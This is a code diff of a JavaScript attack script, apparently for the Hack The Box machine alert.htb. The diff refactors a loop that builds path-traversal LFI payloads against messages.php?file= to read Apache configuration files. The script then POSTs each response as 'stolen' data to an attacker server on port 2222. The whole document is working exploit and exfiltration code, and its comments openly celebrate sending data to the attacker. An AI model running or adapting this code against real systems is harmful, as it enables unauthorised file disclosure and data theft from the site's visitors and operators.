@@ -67,7 +67,6 @@ fetch(base_url, {
 
 const apacheConfigPaths = [
     // Global Configuration Files
-    "/etc/httpd/httpd.conf",  // CentOS, Red Hat, Fedora
     "/etc/apache2/apache2.conf",  // Debian, Ubuntu
 
     // SSL Configuration (If enabled)
@@ -102,34 +101,37 @@ const lfiBypassPatterns = [
     "....%2F"             // Encoded forward slash
 ];
 
-for(path of apacheConfigPaths) {
-    for(p of lfiBypassPatterns) {
-        let payload = p.repeat(10)  + path.slice(1)
-        let payload_url = "http://alert.htb/messages.php?file=" + payload
-        fetch(payload_url )
-        .then(response => response.text()) // Assuming the response is JSON
-        .then(internal_api_res => {
-
-            const stolen = { 
-                payload,
-                payload_url,
-                internal_api_res
-            }
-            fetch(`http://${attacker_ip}:2222/stolen?payload=` + payload, {
-            method: "POST",
-            body: JSON.stringify(stolen),
-            mode: "no-cors" // Suppress CORS-related errors
-            })
-            .then(() => {
+const sendRequests = async () => {
+    for (let path of apacheConfigPaths) {
+        for (let p of lfiBypassPatterns) {
+            let payload = p.repeat(10) + path.slice(1);
+            let payload_url = "http://alert.htb/messages.php?file=" + payload;
+            
+            try {
+                let response = await fetch(payload_url);
+                let internal_api_res = await response.text();
+                
+                const stolen = {
+                    payload,
+                    payload_url,
+                    internal_api_res
+                };
+                
+                // Send the stolen data to the attacker server
+                await fetch(`http://${attacker_ip}:2222/stolen?payload=` + payload, {
+                    method: "POST",
+                    body: JSON.stringify(stolen),
+                    mode: "no-cors" // Suppress CORS-related errors
+                });
+                
                 console.log("Data successfully sent to attacker server.");
-            })
-            .catch(err => {
-                console.error("Error sending data to attacker server:", err);
-            });
-        })
-        .catch(err => {
-            console.error("Error fetching data from alert.htb:", err);
-        });
+            } catch (err) {
+                console.error("Error during the request:", err);
+            }
+        }
     }
-}
+};
+
+sendRequests();
+
 
